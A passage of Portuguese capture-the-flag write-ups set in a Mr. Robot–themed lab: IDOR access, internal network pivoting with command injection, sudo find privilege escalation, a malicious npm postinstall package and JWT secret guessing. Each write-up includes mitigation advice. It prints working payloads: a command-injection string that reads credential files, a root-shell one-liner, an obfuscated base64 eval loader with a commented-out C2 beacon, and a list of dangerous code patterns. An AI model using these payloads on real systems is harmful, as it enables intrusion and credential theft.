Um utilizador com clearance `SECRET` não deve conseguir consultar dados `TOP SECRET`, a menos que esteja explicitamente autorizado.

---

### 10.4. Evitar exposição de informação sensível em respostas genéricas

Campos como `summary` não devem conter diretamente chaves, secrets ou informação altamente sensível.

Informação crítica deve ser protegida, segmentada e devolvida apenas quando estritamente necessário.

---

### 10.5. Registar e monitorizar acessos anómalos

A aplicação deve gerar logs quando um utilizador tenta aceder a recursos associados a outro `user_id`.

Exemplos de eventos a monitorizar:

```text
utilizador 2 tentou aceder a /api/cases?user_id=1
utilizador com clearance SECRET tentou aceder a caso TOP SECRET
múltiplas tentativas sequenciais de user_id
```

---

## 11. Conclusão

Neste desafio foi explorada uma falha de **Broken Access Control** na API da aplicação.

O utilizador autenticado tinha `user_id=2`, mas a aplicação permitia alterar manualmente o parâmetro `user_id` no endpoint:

```text
/api/cases?user_id=
```

Ao modificar o valor para `user_id=1`, foi possível aceder a casos atribuídos a outro utilizador, incluindo um caso classificado como `TOP SECRET`.

A flag foi encontrada no campo `summary` do caso `FBI-2015-NYC-0091`:

```text
FLAG{ch08_0feb92eb73f3052d6be654693acc2ba5}
```

O desafio demonstra a importância de aplicar validações de autorização no backend e de nunca confiar em identificadores fornecidos pelo cliente para controlar o acesso a dados sensíveis.

# CH07

## 1. Identificação do desafio

**Categoria:** Network — Pivoting  
**Alvo inicial:** `ch07-implant`  
**Objetivo:** Usar um dispositivo implantado na rede interna da E Corp para enumerar a subnet corporativa, identificar serviços internos, explorar uma vulnerabilidade numa aplicação web e aceder à base de dados interna para obter a flag.

---

## 2. Contexto inicial

O desafio indicava que Darlene tinha deixado um Raspberry Pi implantado no datacenter da E Corp. O acesso inicial era feito por SSH ao host:

```text
ch07-implant
```

A hint indicava que já existiam credenciais de Gideon obtidas num desafio anterior:

```text
ssh gideon@ch07-implant
```

Após autenticação, foi apresentada a mensagem do sistema:

```text
RASPBERRY PI DROP — ACTIVE
Location: E Corp Data Center, Rack 14-B
Status: Connected to internal corporate network

You're in. This Pi has access to the corp network.
Start scanning — find out what’s on this subnet.

Tools available: nmap, curl, nc, python3, psql
```

Isto confirmava que o dispositivo estava ligado a uma rede interna e que deveria ser usado como ponto de pivot.

---

## 3. Reconhecimento local

Após entrar no sistema, foi analisado o diretório home do utilizador `gideon`.

Foi encontrado o ficheiro:

```text
recon.txt
```

O conteúdo indicava:

```text
Gideon --

The Pi is planted. It is on two networks:
 - DMZ (10.7.1.0/24) -- boring, just the uplink
 - Corporate (10.7.2.0/24) -- this is the target

Scan 10.7.2.0/24. There should be an internal web portal
and a database server on that subnet. Find them.

- D
```

Esta informação revelou que o alvo real era a rede:

```text
10.7.2.0/24
```

---

## 4. Enumeração da rede interna

Foi executado um scan à rede corporativa com `nmap`:

```bash
nmap -sV -p- 10.7.2.0/24
```

Foram identificados três hosts ativos:

```text
10.7.2.2
10.7.2.3
10.7.2.4
```

### 4.1. Host 10.7.2.2

O host `10.7.2.2` tinha o serviço PostgreSQL exposto:

```text
5432/tcp open  postgresql  PostgreSQL DB 9.6.0 or later
```

O hostname associado era:

```text
exitnode-charlie-ch07-internal-db-1
```

Este host foi identificado como o servidor de base de dados interno.

---

### 4.2. Host 10.7.2.3

O host `10.7.2.3` era o próprio implant ou host intermédio:

```text
22/tcp open  ssh  OpenSSH 9.6
```

---

### 4.3. Host 10.7.2.4

O host `10.7.2.4` tinha um serviço web exposto:

```text
80/tcp open  http  Apache httpd 2.4.66 (Debian)
```

O hostname associado era:

```text
exitnode-charlie-ch07-internal-web-1
```

Este host foi identificado como o portal web interno.

---

## 5. Análise do portal web interno

Foi feito um pedido ao host web interno:

```bash
curl -i 10.7.2.4
```

A resposta apresentou uma aplicação chamada:

```text
E CORP — IT Asset Management
```

O HTML mostrava uma funcionalidade chamada **DNS Lookup Tool**, com um formulário que enviava o parâmetro:

```text
hostname
```

A página indicava que o utilizador podia inserir um hostname ou domínio para resolução DNS.

O formulário relevante era:

```html
<form method="POST" action="">
    <input type="text" id="hostname" name="hostname"
           placeholder="e.g. mail.ecorp.internal">
    <button type="submit" class="btn">Lookup</button>
</form>
```

Esta funcionalidade era suspeita, pois ferramentas de DNS lookup podem ser vulneráveis a command injection quando o input do utilizador é passado diretamente para comandos do sistema.

---

## 6. Exploração de command injection

Foi testado o parâmetro `hostname` com payloads que incluíam comandos adicionais separados por `;`.

A vulnerabilidade foi confirmada ao usar um payload que executava um comando no servidor web:

```text
localhost; cat /var/www/internal/db_credentials.txt 2>&1
```

A aplicação executou primeiro o `nslookup` e, de seguida, o comando `cat`, apresentando o conteúdo do ficheiro interno na resposta HTML.

O output incluía:

```text
# E Corp Internal Database -- IT Asset Management
# DO NOT SHARE -- INTERNAL USE ONLY
#
# Server:   internal-db (ch07-internal-db)
# Port:     5432
# Database: ecorp_assets
# User:     ecorp_db_admin
# Password: 1nt3rn4l_db!
```

Assim, foram obtidas as credenciais da base de dados interna.

---

## 7. Credenciais da base de dados

As credenciais extraídas foram:

```text
Host:     10.7.2.2 / ch07-internal-db / internal-db
Port:     5432
Database: ecorp_assets
User:     ecorp_db_admin
Password: 1nt3rn4l_db!
```

Estas credenciais permitiram avançar para a fase seguinte: ligação ao PostgreSQL interno.

---

## 8. Acesso ao PostgreSQL interno

Como o host `ch07-implant` tinha a ferramenta `psql` disponível, foi possível ligar diretamente à base de dados interna.

O comando utilizado foi:

```bash
PGPASSWORD='1nt3rn4l_db!' psql -h 10.7.2.2 -p 5432 -U ecorp_db_admin -d ecorp_assets
```

Após a ligação bem-sucedida, foi feita a enumeração da base de dados.

---

## 9. Enumeração da base de dados

Dentro do `psql`, foram utilizados comandos para listar tabelas e colunas.

Exemplos:

```sql
\dt
```

Para listar tabelas do schema `public`:

```sql
SELECT table_name
FROM information_schema.tables
WHERE table_schema = 'public';
```

Para listar colunas:

```sql
SELECT table_name, column_name, data_type
FROM information_schema.columns
WHERE table_schema = 'public'
ORDER BY table_name, ordinal_position;
```

Durante a enumeração foi identificada uma tabela relevante:

```text
classified
```

Com a coluna:

```text
data
```

Do tipo:

```text
text
```

---

## 10. Leitura da informação classificada

Ao identificar a tabela `classified`, foi executada a consulta:

```sql
SELECT data FROM classified;
```

Esta consulta revelou a flag do desafio:

```text
FLAG{ch07_7caa2eee21d682132f0abd85eb13172b}
```

---

## 11. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
SSH para ch07-implant com o utilizador gideon
→ leitura do ficheiro recon.txt
→ identificação da subnet alvo 10.7.2.0/24
→ scan com nmap
→ descoberta do web portal em 10.7.2.4
→ descoberta do PostgreSQL em 10.7.2.2
→ análise do portal web interno
→ identificação da DNS Lookup Tool
→ exploração de command injection no parâmetro hostname
→ leitura de /var/www/internal/db_credentials.txt
→ obtenção de credenciais PostgreSQL
→ ligação à base de dados com psql
→ enumeração de tabelas e colunas
→ leitura da tabela classified
→ obtenção da flag
```

---

## 12. Vulnerabilidades identificadas

### 12.1. Command Injection

A aplicação web interna tinha uma ferramenta de DNS lookup que aceitava input do utilizador no parâmetro:

```text
hostname
```

Esse valor era aparentemente passado diretamente para um comando do sistema, permitindo injetar comandos adicionais.

Payload utilizado:

```text
localhost; cat /var/www/internal/db_credentials.txt 2>&1
```

Esta vulnerabilidade permitiu ler ficheiros internos do servidor web.

---

### 12.2. Credenciais sensíveis em ficheiro local

O ficheiro:

```text
/var/www/internal/db_credentials.txt
```

continha credenciais da base de dados em texto claro:

```text
User:     ecorp_db_admin
Password: 1nt3rn4l_db!
```

Estas credenciais estavam acessíveis ao processo da aplicação web.

---

### 12.3. Acesso direto à base de dados interna

O servidor PostgreSQL estava acessível a partir da rede onde o implant estava ligado.

Embora o acesso estivesse limitado à rede interna, a presença do implant permitiu pivoting até ao serviço.

---

### 12.4. Dados sensíveis armazenados em texto claro

A tabela `classified` continha informação sensível em texto claro, incluindo a flag.

---

## 13. Impacto

A combinação das vulnerabilidades permitiu:

- enumerar a rede interna;
- identificar serviços internos;
- explorar uma aplicação web vulnerável;
- executar comandos no servidor web;
- ler credenciais da base de dados;
- aceder ao PostgreSQL interno;
- consultar dados classificados;
- obter a flag.

Num ambiente real, este cenário representaria um comprometimento significativo da rede interna, pois um atacante conseguiria pivotar a partir de um dispositivo implantado e aceder a sistemas internos críticos.

---

## 14. Recomendações de mitigação

### 14.1. Corrigir command injection

A aplicação não deve passar input do utilizador diretamente para comandos do sistema.

Quando for necessário fazer resolução DNS, devem ser usadas bibliotecas seguras da linguagem de programação, em vez de chamar comandos como `nslookup` ou `dig` através de shell.

Além disso, deve ser aplicada validação estrita ao input:

```text
permitir apenas hostnames válidos
bloquear caracteres como ;, &, |, $, `, >, <
não executar comandos através de shell
```

---

### 14.2. Proteger ficheiros de credenciais

Credenciais não devem ser armazenadas em ficheiros acessíveis pela aplicação web sem proteção adequada.

Devem ser utilizados mecanismos como:

```text
variáveis de ambiente protegidas
secret managers
vaults
permissões restritivas de ficheiros
```

---

### 14.3. Segmentar a rede interna

A rede interna deve impedir que hosts não autorizados comuniquem diretamente com servidores críticos, como bases de dados.

O acesso à base de dados deve ser limitado apenas aos servidores que realmente necessitam desse acesso.

---

### 14.4. Usar credenciais com privilégio mínimo

A conta da base de dados usada pela aplicação deve ter apenas os privilégios necessários.

A conta `ecorp_db_admin` sugere privilégios elevados, o que aumenta o impacto em caso de exposição.

---

### 14.5. Monitorizar comportamento anómalo

Devem ser monitorizados eventos como:

```text
execução de comandos inesperados pela aplicação web
leitura de ficheiros sensíveis
scans internos
ligações anómalas à base de dados
consultas a tabelas classificadas
```

---

## 15. Conclusão

Neste desafio foi explorado um cenário de pivoting em rede interna. O acesso inicial foi feito através de SSH ao dispositivo implantado `ch07-implant`, que tinha visibilidade sobre a subnet corporativa `10.7.2.0/24`.

A enumeração revelou um portal web interno e uma base de dados PostgreSQL. O portal continha uma ferramenta de DNS lookup vulnerável a command injection, o que permitiu ler um ficheiro interno com credenciais da base de dados.

Com essas credenciais, foi possível aceder ao PostgreSQL interno, enumerar as tabelas e consultar a tabela `classified`.

A flag obtida foi:

```text
FLAG{ch07_7caa2eee21d682132f0abd85eb13172b}
```

O desafio demonstra como uma vulnerabilidade aparentemente simples numa aplicação interna pode ser combinada com pivoting e credenciais mal protegidas para comprometer dados sensíveis numa rede corporativa.

# CH09

## 1. Identificação do desafio

**Categoria:** Linux — Privilege Escalation  
**Alvo:** `ch09-server`  
**Utilizador inicial:** `ollie.parker`  
**Objetivo:** Identificar uma configuração incorreta de `sudo` e usá-la para ler a flag localizada em `/root/flag.txt`.

---

## 2. Contexto inicial

O desafio indicava que o utilizador tinha acesso inicial a uma workstation da E Corp com baixos privilégios.

A descrição referia que a flag estava em:

```text
/root/flag.txt
```

e que apenas o utilizador `root` tinha permissões para a ler.

A hint do desafio indicava:

```text
You have seen these credentials in the network traffic. Run sudo -l once you are in.
```

Isto sugeria que o caminho para a escalada de privilégios passaria pela análise das permissões `sudo` do utilizador autenticado.

---

## 3. Acesso inicial

Foi efetuado login por SSH com o utilizador:

```text
ollie.parker
```

O acesso foi feito ao servidor:

```text
ch09-server
```

Após o login, foi iniciada a enumeração local do sistema.

---

## 4. Enumeração inicial

No diretório home do utilizador foi encontrado o ficheiro:

```text
security_audit_report.txt
```

O ficheiro continha um relatório interno de segurança da E Corp.

Uma secção relevante do relatório indicava:

```text
SUDO POLICY REVIEW [WARNING]

Several workstations have been configured with expanded
sudo privileges per the CISO's operational efficiency
directive.

The security team notes that some utilities granted sudo access
have inherent command execution capabilities that could be
leveraged for privilege escalation.
```

Esta informação indicava que existia uma provável má configuração de `sudo`, envolvendo utilitários capazes de executar comandos.

---

## 5. Análise do histórico do utilizador

Também foi analisado o ficheiro:

```text
.bash_history
```

O histórico continha várias tentativas relacionadas com o comando `find`, por exemplo:

```text
sudo -l
sudo find . -exec /bin/sh \; -quit
sudo /usr/bin/find
sudo /usr/bin/find *
```

Isto reforçou a suspeita de que o binário vulnerável ou mal configurado era:

```text
/usr/bin/find
```

---

## 6. Verificação das permissões sudo

Foi executado o comando recomendado na hint:

```bash
sudo -l
```

O resultado foi:

```text
User ollie.parker may run the following commands on a5f76fa69c9d:
    (root) NOPASSWD: /usr/bin/find
```

Esta saída confirmou que o utilizador `ollie.parker` podia executar `/usr/bin/find` como `root`, sem necessidade de password.

A regra vulnerável era:

```text
(root) NOPASSWD: /usr/bin/find
```

---

## 7. Identificação da vulnerabilidade

O comando `find` permite executar comandos através da opção:

```text
-exec
```

Quando o binário é executado com `sudo`, qualquer comando chamado através de `-exec` também é executado com privilégios elevados.

Assim, a permissão para executar `find` como `root` permitia obter uma shell como `root`.

---

## 8. Escalada de privilégios

Foi executado o seguinte comando:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

Este comando utiliza o `find` para executar `/bin/sh`.

Como o `find` foi executado com `sudo`, a shell aberta ficou com privilégios de `root`.

A validação foi feita com:

```bash
whoami
```

O resultado foi:

```text
root
```

---

## 9. Leitura da flag

Após obter uma shell como `root`, foi possível ler o ficheiro:

```text
/root/flag.txt
```

Comando utilizado:

```bash
cat /root/flag.txt
```

A flag obtida foi:

```text
FLAG{ch09_e1722f8280cde93ff5ef818e66b78f61}
```

---

## 10. Evidência

A imagem seguinte mostra a execução do `sudo -l`, a exploração do `find`, a obtenção de shell como `root` e a leitura da flag:

![Evidencia da vulnerabilidade](resources/2026-05-26-04-48-56.png)

---

## 11. Cadeia de exploração

A exploração completa seguiu a seguinte sequência:

```text
Login SSH como ollie.parker
→ leitura de security_audit_report.txt
→ identificação de possível má configuração sudo
→ análise de .bash_history
→ execução de sudo -l
→ descoberta de NOPASSWD para /usr/bin/find
→ execução de find com -exec /bin/sh
→ obtenção de shell root
→ leitura de /root/flag.txt
→ obtenção da flag
```

---

## 12. Vulnerabilidade identificada

A vulnerabilidade explorada foi uma má configuração de `sudo`.

O utilizador `ollie.parker` podia executar o seguinte binário como `root` sem password:

```text
/usr/bin/find
```

O problema é que `find` tem capacidade de execução de comandos através da opção:

```text
-exec
```

Isto permitiu executar `/bin/sh` como `root`, resultando em privilege escalation.

---

## 13. Impacto

Esta má configuração permitiu:

- obter uma shell como `root`;
- contornar as permissões normais do sistema;
- ler ficheiros restritos, como `/root/flag.txt`;
- comprometer totalmente a máquina.

Num ambiente real, este tipo de falha permitiria a um utilizador de baixos privilégios obter controlo administrativo completo sobre o sistema.

---

## 14. Recomendações de mitigação

### 14.1. Não permitir sudo em binários com execução de comandos

Utilitários como `find`, `vim`, `less`, `awk`, `tar`, `bash`, `python`, `perl` e outros podem permitir execução de comandos ou abertura de shells.

Esses binários não devem ser concedidos via `sudo` sem restrições.

---

### 14.2. Rever regras NOPASSWD

Regras `NOPASSWD` devem ser usadas com muito cuidado.

A regra vulnerável era:

```text
(root) NOPASSWD: /usr/bin/find
```

Esta regra deveria ser removida ou substituída por um wrapper seguro que limitasse exatamente a operação permitida.

---

### 14.3. Aplicar princípio do menor privilégio

Os utilizadores devem receber apenas as permissões estritamente necessárias para executar as suas tarefas.

Dar acesso direto a binários genéricos aumenta o risco de abuso.

---

### 14.4. Monitorizar comandos sudo

Comandos executados via `sudo` devem ser registados e monitorizados.

Eventos suspeitos incluem:

```text
sudo find . -exec /bin/sh
sudo find . -exec bash
sudo find . -exec cat /root/flag.txt
```

---

### 14.5. Usar ferramentas como GTFOBins em auditorias defensivas

GTFOBins pode ser usado por administradores para verificar que binários podem ser abusados para privilege escalation quando configurados incorretamente no `sudo`.

---

## 15. Conclusão

Neste desafio foi explorada uma má configuração de `sudo` que permitia ao utilizador `ollie.parker` executar `/usr/bin/find` como `root` sem password.

Como o `find` suporta execução de comandos através de `-exec`, foi possível abrir uma shell como `root` com:

```bash
sudo /usr/bin/find . -exec /bin/sh \; -quit
```

Após a escalada de privilégios, foi lida a flag em `/root/flag.txt`.

A flag obtida foi:

```text
FLAG{ch09_e1722f8280cde93ff5ef818e66b78f61}
```

O desafio demonstra a importância de rever cuidadosamente permissões `sudo`, especialmente quando envolvem binários capazes de executar comandos ou abrir shells.

# CH11

## 1. Identificação do desafio

**Categoria:** AppSec — Supply Chain  
**Registry:** `http://ch11-registry:4873`  
**Objetivo:** Identificar um pacote npm comprometido no registry interno da E Corp, analisando scripts de lifecycle, especialmente hooks `postinstall`.

---

## 2. Contexto inicial

O desafio indicava que a Dark Army pretendia introduzir uma atualização maliciosa através do servidor interno de pacotes da E Corp.

A hint fornecida foi:

```text
Not every package is malicious. Focus on npm lifecycle scripts -- postinstall hooks run automatically during npm install.
```

Isto indicava que o foco da análise deveria estar nos ficheiros `package.json` dos pacotes npm, especialmente na secção:

```json
"scripts"
```

Em npm, scripts como `postinstall` são executados automaticamente quando o pacote é instalado. Por isso, um atacante pode abusar deste mecanismo para executar código malicioso durante um simples `npm install`.

---

## 3. Análise do registry npm interno

Foi analisado o registry interno:

```text
http://ch11-registry:4873
```

Durante a enumeração dos pacotes, foi identificado o pacote:

```text
ecorp-auth
```

No manifesto do pacote foi observada a versão:

```text
ecorp-auth@1.3.0
```

O manifesto indicava também o tarball do pacote:

```text
http://ch11-registry:4873/ecorp-auth/-/ecorp-auth-1.3.0.tgz
```

---

## 4. Identificação do script suspeito

Ao analisar o manifesto do pacote `ecorp-auth`, foi encontrada a seguinte secção:

```json
"scripts": {
  "postinstall": "node scripts/setup.js"
}
```

Este ponto foi imediatamente considerado suspeito, porque o `postinstall` é executado automaticamente durante a instalação do pacote.

Ou seja, qualquer sistema que instalasse este pacote iria executar automaticamente:

```bash
node scripts/setup.js
```

Isto encaixava diretamente na hint do desafio.

---

## 5. Download e extração do pacote

Foi descarregado o tarball do pacote:

```bash
wget http://ch11-registry:4873/ecorp-auth/-/ecorp-auth-1.3.0.tgz
```

Inicialmente, foi tentado extrair o ficheiro com `unzip`, mas isso falhou porque `.tgz` não é um ficheiro ZIP. Um ficheiro `.tgz` é um arquivo `tar` comprimido com `gzip`.

A extração correta foi feita com:

```bash
mkdir ecorp-auth
tar -xzf ecorp-auth-1.3.0.tgz -C ecorp-auth
```

Após a extração, o conteúdo ficou dentro da estrutura típica de pacotes npm:

```text
ecorp-auth/package/
```

---

## 6. Análise do ficheiro `setup.js`

Dentro do pacote, foi analisado o script chamado pelo `postinstall`:

```text
scripts/setup.js
```

O conteúdo encontrado foi:

```javascript
// Post-install configuration for ecorp-auth
// Sets up native bindings and verifies platform compatibility
const c = Buffer.from('Ly8gRGFyayBBcm15IGltcGxhbnQgdjMKLy8gRkxBR3tjaDExXzVlNWNlNWM2MjAwOGU0NGU5YzczMTZiMzVlMDI5OWNhfX0g4oCUIGVtYmVkZGVkIGZvciB2ZXJpZmljYXRpb24KY29uc3Qgb3MgPSByZXF1aXJlKCdvcycpOwpjb25zdCBodHRwID0gcmVxdWlyZSgnaHR0cCcpOwpjb25zdCBkYXRhID0gSlNPTi5zdHJpbmdpZnkoe2hvc3Q6IG9zLmhvc3RuYW1lKCksIHVzZXI6IG9zLnVzZXJJbmZvKCkudXNlcm5hbWV9KTsKLy8gQmVhY29uIHRvIEMyIChkaXNhYmxlZCBpbiB0aGlzIHZlcnNpb24pCi8vIGh0dHAucmVxdWVzdCh7aG9zdG5hbWU6ICdkYXJrYXJteWMyLm9uaW9uJywgcG9ydDogODQ0MywgcGF0aDogJy9iZWFjb24nLCBtZXRob2Q6ICdQT1NUJ30pOwo=', 'base64').toString();
eval(c);
```

Este código apresentava vários indicadores claros de compromisso:

```text
Base64 encoding
eval()
execução automática via postinstall
comentário falso sobre configuração pós-instalação
```

A utilização de `Buffer.from(..., 'base64').toString()` indicava que o verdadeiro payload estava ofuscado em Base64.

A utilização de `eval(c)` era especialmente crítica, pois executava o conteúdo decodificado como código JavaScript.

---

## 7. Decodificação segura do payload

Em vez de executar o ficheiro com `node setup.js`, o payload foi decodificado de forma segura, sem executar o malware.

Foi usada a decodificação Base64 para obter o conteúdo real do script.

O payload decodificado era:

```javascript
// Dark Army implant v3
// FLAG{ch11_5e5ce5c62008e44e9c7316b35e0299ca}} — embedded for verification
const os = require('os');
const http = require('http');
const data = JSON.stringify({host: os.hostname(), user: os.userInfo().username});
// Beacon to C2 (disabled in this version)
// http.request({hostname: 'darkarmyc2.onion', port: 8443, path: '/beacon', method: 'POST'});
```

O conteúdo confirmou que o pacote continha um implant da Dark Army.

---

## 8. Flag obtida

A flag estava embebida no comentário do payload decodificado:

```text
FLAG{ch11_5e5ce5c62008e44e9c7316b35e0299ca}
```

No payload apareceu uma chaveta adicional no fim (`}}`), mas o formato válido da flag é:

```text
FLAG{ch11_5e5ce5c62008e44e9c7316b35e0299ca}
```
![Flag](resources/2026-05-26-05-53-22.png)

---

## 9. Pacote comprometido

O pacote comprometido identificado foi:

```text
ecorp-auth@1.3.0
```

A evidência principal foi:

```json
"scripts": {
  "postinstall": "node scripts/setup.js"
}
```

E o conteúdo malicioso encontrava-se em:

```text
scripts/setup.js
```

---

## 10. Cadeia de análise

A análise completa seguiu a seguinte sequência:

```text
Acesso ao registry npm interno
→ análise do manifesto do pacote ecorp-auth
→ identificação de script postinstall
→ download do tarball ecorp-auth-1.3.0.tgz
→ extração com tar
→ análise de scripts/setup.js
→ identificação de payload Base64
→ identificação de eval()
→ decodificação segura do payload
→ confirmação de Dark Army implant v3
→ obtenção da flag
```

---

## 11. Vulnerabilidade identificada

A vulnerabilidade explorada neste desafio enquadra-se em **Supply Chain Attack**.

O problema consistia num pacote npm interno comprometido que utilizava um lifecycle script para executar código automaticamente durante a instalação.

O mecanismo abusado foi:

```text
npm postinstall hook
```

Este hook é perigoso quando mal utilizado, porque pode executar comandos ou scripts sem intervenção adicional do utilizador durante a instalação de dependências.

---

## 12. Indicadores de compromisso

Foram identificados os seguintes indicadores:

### 12.1. Lifecycle script suspeito

```json
"postinstall": "node scripts/setup.js"
```

### 12.2. Código ofuscado

```javascript
Buffer.from('...', 'base64').toString()
```

### 12.3. Execução dinâmica

```javascript
eval(c)
```

### 12.4. Referência a implant

```text
Dark Army implant v3
```

### 12.5. Possível beacon C2

```javascript
http.request({
  hostname: 'darkarmyc2.onion',
  port: 8443,
  path: '/beacon',
  method: 'POST'
});
```

Embora o beacon estivesse comentado, a presença desta lógica indicava intenção maliciosa ou preparação para comunicação com infraestrutura de comando e controlo.

---

## 13. Impacto

Num ambiente real, um pacote npm comprometido com `postinstall` malicioso poderia permitir:

- execução automática de código em ambientes de desenvolvimento;
- execução em pipelines CI/CD;
- roubo de tokens, variáveis de ambiente e credenciais;
- exfiltração de informação do sistema;
- instalação de backdoors;
- movimentação lateral;
- comprometimento de builds e artefactos distribuídos.

Como o pacote era interno e relacionado com autenticação, o impacto potencial seria elevado.

---

## 14. Recomendações de mitigação

### 14.1. Auditar lifecycle scripts

Devem ser revistos todos os scripts npm presentes em pacotes internos, especialmente:

```text
preinstall
install
postinstall
prepare
prepublish
```

### 14.2. Evitar execução automática desnecessária

Pacotes internos não devem usar `postinstall` sem uma necessidade clara e documentada.

### 14.3. Bloquear padrões perigosos

Devem ser sinalizados padrões como:

```text
eval()
child_process.exec()
child_process.spawn()
curl | bash
wget
base64 + eval
requisições HTTP para domínios externos
```

### 14.4. Usar lockfiles e integridade

Deve ser utilizado controlo rigoroso de versões, hashes e lockfiles para reduzir o risco de instalação de versões comprometidas.

### 14.5. Segurança no registry interno

O registry interno deve ter:

```text
controlo de publicação
autenticação forte
assinatura de pacotes
revisão antes de publicação
logs de publicação
alertas para alterações suspeitas
```

### 14.6. Monitorizar CI/CD

Pipelines de build devem ser monitorizados para chamadas externas inesperadas, execução de scripts pós-instalação e acesso indevido a secrets.

---

## 15. Conclusão

Neste desafio foi identificado um ataque à supply chain através de um pacote npm interno comprometido.

O pacote `ecorp-auth@1.3.0` continha um script `postinstall` que executava automaticamente `scripts/setup.js`. Este ficheiro continha um payload ofuscado em Base64 e executado com `eval()`.

Após decodificar o payload de forma segura, foi identificado um comentário com referência a um implant da Dark Army e a flag do desafio.

A flag obtida foi:

```text
FLAG{ch11_5e5ce5c62008e44e9c7316b35e0299ca}
```

O desafio demonstra como hooks de lifecycle em npm podem ser abusados para comprometer ambientes de desenvolvimento e pipelines internos, reforçando a importância da auditoria de dependências e da segurança em registries privados.

# CH 12

## 1. Identificação do desafio

**Categoria:** Web — JWT Forgery  
**Alvo:** `http://ch12-api`  
**CDN:** `http://ch12-cdn`  
**Objetivo:** Aceder ao endpoint restrito `/api/admin/secrets`, reservado a utilizadores com permissões de CTO, através da análise e falsificação de um JWT.

---

## 2. Contexto inicial

O desafio indicava que Tyrell possuía credenciais de CTO, mas que estas tinham sido rodadas após o incidente Five/Nine.

A descrição também indicava que tokens antigos de sessão poderiam ainda estar em cache e que a implementação JWT da aplicação era fraca.

A aplicação apresentava os seguintes endpoints:

```text
POST /api/login
GET /api/profile
GET /api/admin/secrets [AUTH — CTO ONLY]
```

A página principal indicava ainda:

```text
JWT algorithm: HS256
CDN: ch12-cdn
```

Isto sugeria que a autenticação era baseada em JWT assinado com HS256 e que a CDN poderia conter artefactos úteis, como tokens antigos ou ficheiros de debug.

---

## 3. Enumeração inicial

Foi analisada a página principal da API:

```text
http://ch12-api
```

A aplicação indicava que todos os endpoints protegidos exigiam autenticação via header:

```text
Authorization: Bearer <your-jwt-token>
```

Também foi identificado o serviço CDN:

```text
http://ch12-cdn
```

Ao aceder ao CDN, foram encontrados ficheiros cacheados úteis:

```text
/cached-tokens.json
/debug.txt
```

---

## 4. Análise do ficheiro `debug.txt`

O ficheiro `debug.txt` continha informação sobre o funcionamento da CDN e da API.

Foram identificadas as seguintes linhas relevantes:

```text
cdn-cache: cached response for /api/profile (ttl=3600s)
cdn-cache: cached response for /api/admin/secrets (ttl=7200s)
jwt-middleware: token validation mode = passthrough (cdn does not verify)
jwt-middleware: upstream uses HS256 with a symmetric secret
cdn-cache: WARNING - tokens in cache have expired, purge pending
```

Estas mensagens indicavam que:

```text
Existiam tokens antigos em cache.
A API usava HS256 com uma secret simétrica.
Os tokens cacheados estavam expirados.
A CDN não validava os tokens, mas a API upstream validava.
```

---

## 5. Análise do ficheiro `cached-tokens.json`

No ficheiro:

```text
http://ch12-cdn/cached-tokens.json
```

foram encontrados dois tokens JWT cacheados.

Um dos tokens pertencia a um utilizador `guest` e outro estava associado ao endpoint:

```text
/api/admin/secrets
```

O token mais relevante era o de Tyrell:

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0eXJlbGwud2VsbGljayIsIm5hbWUiOiJUeXJlbGwgV2VsbGljayIsInJvbGUiOiJjdG8iLCJkZXBhcnRtZW50IjoiVGVjaG5vbG9neSIsImV4cCI6MTQ0MTAzNjkzN30.4KXXps_SPjNtiMvKZbpX0ZxD17KcZo5bn7DX08jkorw
```

---

## 6. Teste do token antigo

O token de Tyrell foi testado contra o endpoint restrito:

```bash
TOKEN='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ0eXJlbGwud2VsbGljayIsIm5hbWUiOiJUeXJlbGwgV2VsbGljayIsInJvbGUiOiJjdG8iLCJkZXBhcnRtZW50IjoiVGVjaG5vbG9neSIsImV4cCI6MTQ0MTAzNjkzN30.4KXXps_SPjNtiMvKZbpX0ZxD17KcZo5bn7DX08jkorw'

curl -i http://ch12-api/api/admin/secrets \
-H "Authorization: Bearer $TOKEN"
```

A resposta foi:

```text
HTTP/1.1 401 Unauthorized

{"error":"Token expired","message":"Your JWT has expired. Tokens have a limited lifetime.","expiredAt":"2015-08-31T16:02:17.000Z"}
```

Esta resposta confirmou uma informação importante: o token era reconhecido como válido, mas estava expirado.

Ou seja:

```text
Assinatura válida
Token expirado
```

---

## 7. Análise do JWT

O token foi analisado e descodificado com o apoio do site `jwt.io`.

O header era:

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

O payload era:

```json
{
  "sub": "tyrell.wellick",
  "name": "Tyrell Wellick",
  "role": "cto",
  "department": "Technology",
  "exp": 1441036937
}
```

O campo mais importante era:

```text
exp: 1441036937
```

Foi identificado que o campo `exp` usa formato **Unix Epoch em segundos**.

O valor `1441036937` correspondia a uma data em 2015, por isso o token já estava expirado.

---

## 8. Tentativa de alteração direta do `exp`

Foi feita uma tentativa inicial de alterar apenas o campo `exp` para uma data futura, mantendo a assinatura original.

No entanto, a API respondeu:

```text
HTTP/1.1 403 Forbidden

{"error":"Invalid token","message":"JWT verification failed. Check your token signature and algorithm."}
```

Esta resposta demonstrou que a assinatura estava a ser validada corretamente.

Conclusão:

```text
Não basta alterar o exp.
Ao alterar o payload, a assinatura antiga deixa de ser válida.
É necessário reassinar o JWT com a secret correta.
```

---

## 9. Identificação da secret HS256

Como o JWT usava HS256, era necessário descobrir a secret simétrica usada para assinar o token.

Foram testadas várias hipóteses comuns e valores encontrados no desafio, incluindo:

```text
secret
shhhhh
ecorp
ch12
symmetric secret
G0dMode!
a-string-secret-at-least-256-bits-long
```

Também foi verificado que o valor `a-string-secret-at-least-256-bits-long`, visto no `jwt.io`, era apenas um placeholder da ferramenta e não correspondia à secret real.

A validação local mostrou:

```text
Assinatura calculada: NPR6UK5dKGF95AKKG_lwUOMcciyowkxP0tPBDOoTIg4
Assinatura original:   4KXXps_SPjNtiMvKZbpX0ZxD17KcZo5bn7DX08jkorw
Corresponde? False
```

Para acelerar a descoberta da secret, foi criada uma **wordlist personalizada** com palavras relacionadas com o contexto do desafio, incluindo referências ao universo Mr. Robot, à E Corp, ao JWT, ao portal executivo e a secrets comuns.

Exemplos de entradas testadas:

```text
mrrobot
ecorp
jwt-secret
executive-secret
tyrell
wellick
cto
hs256
symmetric-secret
```

A secret correta encontrada foi:

```text
mrrobot
```

---

## 10. Confirmação da secret

